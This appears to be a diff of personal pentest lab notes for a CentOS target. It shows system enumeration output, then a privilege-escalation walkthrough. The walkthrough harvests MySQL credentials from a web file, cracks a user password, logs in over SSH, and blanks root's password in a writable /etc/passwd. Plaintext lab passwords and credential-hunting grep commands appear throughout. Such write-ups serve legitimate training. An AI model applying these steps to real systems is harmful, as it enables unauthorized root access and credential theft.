+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+chrony:x:998:996::/var/lib/chrony:/sbin/nologin
+michael:x:1000:1000:Michael:/home/michael:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+
+[+] home directories
+$ ls -la /home
+total 0
+drwxr-xr-x.  3 root    root     21 Jun  9  2020 .
+dr-xr-xr-x. 17 root    root    224 Jun  9  2020 ..
+drwx------.  2 michael michael 158 Jan 13 14:48 michael
+
+[+] root home (if accessible)
+$ ls -la /root 2>/dev/null
+
+[+] sudo -l
+$ sudo -l 2>/dev/null
+[sudo] password for michael: 
+
+[+] sudo -V (first 10)
+$ sudo -V 2>/dev/null | head -n 10
+Sudo version 1.8.23
+Sudoers policy plugin version 1.8.23
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.23
+
+[+] text files in /home
+$ find /home -type f -name "*.txt" 2>/dev/null
+/home/michael/local.txt
+/home/michael/privesc_2026-01-13_144852.txt
+
+[+] history files in /home
+$ find /home -type f -name "*history*" 2>/dev/null
+/home/michael/.bash_history
+
+[+] ssh keys in /home
+$ find /home -type f \( -name "id_rsa" -o -name "id_*" \) 2>/dev/null
+
+[+] sensitive strings in /home (first 50)
+$ grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head -n 50
+/home/michael/pg_privesc.sh:run_cmd "/etc/passwd" "cat /etc/passwd"
+/home/michael/pg_privesc.sh:run_cmd "grep password in /etc (first 50)" "grep -R \"password\" /etc 2>/dev/null | head -n 50"
+/home/michael/pg_privesc.sh:run_cmd "web creds (first 50)" "grep -R \"password\\|db\\|user\" /var/www 2>/dev/null | head -n 50"
+/home/michael/pg_privesc.sh:run_cmd "ssh keys in /home" "find /home -type f \\( -name \"id_rsa\" -o -name \"id_*\" \\) 2>/dev/null"
+/home/michael/pg_privesc.sh:run_cmd "sensitive strings in /home (first 50)" "grep -Ri \"password\\|passwd\\|secret\\|token\\|key\" /home 2>/dev/null | head -n 50"
+/home/michael/privesc_2026-01-13_144852.txt:[+] /etc/passwd
+/home/michael/privesc_2026-01-13_144852.txt:$ cat /etc/passwd
+/home/michael/privesc_2026-01-13_144852.txt:/proc/1/task/1/attr/keycreate
+/home/michael/privesc_2026-01-13_144852.txt:/proc/1/attr/keycreate
+/home/michael/privesc_2026-01-13_144852.txt:/proc/2/task/2/attr/keycreate
+/home/michael/privesc_2026-01-13_144852.txt:/proc/2/attr/keycreate
+/home/michael/privesc_2026-01-13_144852.txt:/proc/4/task/4/attr/keycreate
+/home/michael/privesc_2026-01-13_144852.txt:/proc/4/attr/keycreate
+/home/michael/privesc_2026-01-13_144852.txt:/proc/6/task/6/attr/keycreate
+/home/michael/privesc_2026-01-13_144852.txt:/proc/6/attr/keycreate
+/home/michael/privesc_2026-01-13_144852.txt:/proc/7/task/7/attr/keycreate
+/home/michael/privesc_2026-01-13_144852.txt:/proc/7/attr/keycreate
+/home/michael/privesc_2026-01-13_144852.txt:/usr/bin/gpasswd
+/home/michael/privesc_2026-01-13_144852.txt:/usr/bin/passwd
+/home/michael/privesc_2026-01-13_144852.txt:/usr/libexec/openssh/ssh-keysign
+/home/michael/privesc_2026-01-13_144852.txt:keyutils-libs-1.5.8-3.el7.x86_64
+/home/michael/privesc_2026-01-13_144852.txt:gpg-pubkey-f4a80eb5-53a7ff4b
+/home/michael/privesc_2026-01-13_144852.txt:[+] grep password in /etc (first 50)
+/home/michael/privesc_2026-01-13_144852.txt:$ grep -R "password" /etc 2>/dev/null | head -n 50
+/home/michael/privesc_2026-01-13_144852.txt:/etc/pki/tls/openssl.cnf:# input_password = secret
+/home/michael/privesc_2026-01-13_144852.txt:/etc/pki/tls/openssl.cnf:# output_password = secret
+/home/michael/privesc_2026-01-13_144852.txt:/etc/pki/tls/openssl.cnf:challengePassword          = A challenge password
+/home/michael/privesc_2026-01-13_144852.txt:Binary file /etc/pki/nssdb/key3.db matches
+/home/michael/privesc_2026-01-13_144852.txt:Binary file /etc/pki/nssdb/key4.db matches
+/home/michael/privesc_2026-01-13_144852.txt:Binary file /etc/openldap/certs/key3.db matches
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'MD4 hash of the unicode password'
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Timestamp of the last password update'
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Timestamp of when the user is allowed to update the password'
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Timestamp of when the password will expire'
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Bad password attempt count'
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Time of the last bad password attempt'
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Concatenated MD5 hashes of the salted NT passwords used on this account'
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:# "min password length"
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Minimal password length (default: 5)'
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:# "password history"
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:# "user must logon to change password"
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Force Users to logon for password change (default: 0 => off, 2 => on)'
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:# "maximum password age"
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Maximum password age, in seconds (default: -1 => never expire passwords)'
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:# "minimum password age"
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Minimum password age, in seconds (default: 0 => allow immediate password change)'
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:# "refuse machine password change"
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Clear text password (used for trusted domain passwords)'
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:  DESC 'Previous clear text password (used for trusted domain passwords)'
+/home/michael/privesc_2026-01-13_144852.txt:/etc/openldap/schema/samba.schema:## Trust password for trust relationships (any kind)
+
+[+] backup files (first 50)
+$ find / -name "*.bak" -o -name "*~" 2>/dev/null | head -n 50
+/etc/nsswitch.conf.bak
+
+================================================================================
+10) Containers / Virtualization
+================================================================================
+
+[+] docker env file
+$ ls -la /.dockerenv 2>/dev/null
+
+[+] cgroup hints
+$ grep -i docker /proc/1/cgroup 2>/dev/null
+
+
+```
+
+5. Automated Enumeration
+
+```
+
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                                                   
+/etc/passwd
 
 
 
@@ -675,20 +1372,63 @@ find / -name "*.bak" -o -name "*~" 2>/dev/null | head
 5. Possible PE Paths
 
 ```
-
+/etc/passwd is owned by user Michael.
 
 
 ```
+
+
 
 **Privilege Escalation**
 
 1. PE Steps
+Apache to Michael
 
+- Remembered that there was a db.php file on the root of the website from doing web recon. Navigated to /var/www/html/db.php and viewed. 
+![[Pasted image 20260113123350.png]]
+- Logged into mysql using found credentials.
 ```
-
+mysql -u root -p
+mysql -u root -p
+Enter password: MalapropDoffUtilize1337
 ```
+![[Pasted image 20260113123513.png]]
 
-2. Notes
+- Viewed databases, selected SimplePHPGal DB, and view tables.
+```
+show databases;
+use SimplePHPGal;
+show tables;
+select * from users;
+```
+![[Pasted image 20260113123807.png]]
+
+- Since I knew there was a Michael account, I cracked password string using Cyberchef. 
+![[Pasted image 20260113123908.png]]
+
+- Used Michael:HockSydneyCertify123 to ssh into host had obtain local.txxt
+![[Pasted image 20260113124128.png]]
+
+2. PE Steps Michael to Root.
+
+- Noticed that /etc/passwd is owned by user Michael when running linpeas.sh.
+![[Pasted image 20260113145413.png]]
+- Edited the root user in the /etc/passwd file to remove password. 
+```
+vi /etc/passwd
+root::0:0:root:/root:/bin/bash
+:wq!
+```
+![[Pasted image 20260113145933.png]]
+
+- Switched user to root.
+```
+su root
+cat /root/proof.txt
+```
+![[Pasted image 20260113150042.png]]
+
+3. Notes
 
 ```
 
